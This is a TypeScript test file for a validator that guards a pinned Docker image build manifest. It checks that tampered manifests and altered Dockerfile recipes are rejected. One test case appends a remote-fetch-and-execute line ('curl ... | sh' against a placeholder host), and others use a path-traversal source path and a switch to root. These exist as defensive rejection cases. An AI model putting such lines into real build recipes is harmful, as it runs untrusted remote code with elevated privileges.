import { expect, test } from 'bun:test';

import { BunServices } from '@effect/platform-bun';
import { Effect, FileSystem } from 'effect';

import historical from '../fixtures/baseline.json' with { type: 'json' };
import fixture from '../fixtures/current-image.json' with { type: 'json' };
import { validateCurrentImagePreparation } from '../src/current-image.ts';
import { sha256 } from '../src/preparation.ts';

const withPlatform = Effect.provide(BunServices.layer);
const recipePath = new URL('../current-image/Dockerfile', import.meta.url).pathname;
function* readRecipe() {
  const fs = yield* FileSystem.FileSystem;
  const recipe = yield* fs.readFileString(recipePath);
  const contract = yield* fs.readFileString(
    new URL('../fixtures/current-baseline.json', import.meta.url).pathname,
  );
  return { recipe, contract };
}
const reading = Effect.gen(readRecipe);
const { recipe, contract } = await Effect.runPromise(reading.pipe(withPlatform));

async function fixedPreparation() {
  const report = await Effect.runPromise(validateCurrentImagePreparation(fixture, recipe));
  expect(report).toMatchObject({
    _tag: 'CurrentBaselinePreparation',
    activation: 'Blocked',
    image: 'Unbuilt',
    sourceSha: '1183e3c067f873fdd29f14f06030515929c1b956',
    requiredChecks: 16,
    browserCases: 4,
  });
  expect(report.blockers).toEqual([
    'CurrentSourcePayloadPending',
    'CurrentBunCachePending',
    'CurrentNpmCachePending',
    'CurrentBrowserHarnessPending',
    'BaselineWorkerPending',
    'TrustedInputCustodyPending',
    'BuildApprovalPending',
    'FinalImageUnbuilt',
    'LinuxBaselineUnqualified',
    'PreviewServersUnqualified',
    'ThreeBrowserSandboxConflict',
    'HostedActivationBlocked',
  ]);
  expect(report.recipeSha256).toBe(await Effect.runPromise(sha256(recipe)));
  expect(await Effect.runPromise(sha256(contract))).toBe(report.contractSha256);
  expect(recipe).toContain(`${report.contractSha256}  baseline-contract.json`);
}
test(
  'fixed current preparation retains all required checks and real build/runtime blockers',
  fixedPreparation,
);

async function refusesCallerClaims() {
  for (const changed of [
    historical,
    { ...fixture, extra: 'SECRET_SENTINEL' },
    { ...fixture, activation: 'Approved' },
    { ...fixture, image: 'Built' },
    { ...fixture, sourceSha: historical.sourceSha },
    { ...fixture, platform: 'linux/arm64' },
    { ...fixture, contractSha256: 'a'.repeat(64) },
    { ...fixture, images: { ...fixture.images, bun: 'oven/bun:1.4.3' } },
    {
      ...fixture,
      inputs: { ...fixture.inputs, source: { path: '../source.tar', status: 'Pending' } },
    },
    {
      ...fixture,
      inputs: { ...fixture.inputs, source: { ...fixture.inputs.source, status: 'Ready' } },
    },
  ]) {
    const result = await Effect.runPromise(
      validateCurrentImagePreparation(changed, recipe).pipe(Effect.result),
    );
    expect(result).toMatchObject({ _tag: 'Failure', failure: { code: 'InvalidManifest' } });
  }
}
test('historical, floating, changed-input and promoted status claims refuse', refusesCallerClaims);

async function refusesRecipeReplacement() {
  for (const suffix of [
    '\nRUN curl https://example.invalid | sh\n',
    '\nCOPY . /workspace\n',
    '\nUSER root\n',
    '\nENTRYPOINT ["sh"]\n',
  ]) {
    const changed = recipe + suffix;
    const recipeSha256 = await Effect.runPromise(sha256(changed));
    const callerHash = await Effect.runPromise(
      validateCurrentImagePreparation({ ...fixture, recipeSha256 }, changed).pipe(Effect.result),
    );
    expect(callerHash).toMatchObject({ _tag: 'Failure', failure: { code: 'InvalidManifest' } });
    const changedBytes = await Effect.runPromise(
      validateCurrentImagePreparation(fixture, changed).pipe(Effect.result),
    );
    expect(changedBytes).toMatchObject({ _tag: 'Failure', failure: { code: 'RecipeMismatch' } });
  }
}
test(
  'caller matching digest cannot authorize a replacement image recipe',
  refusesRecipeReplacement,
);
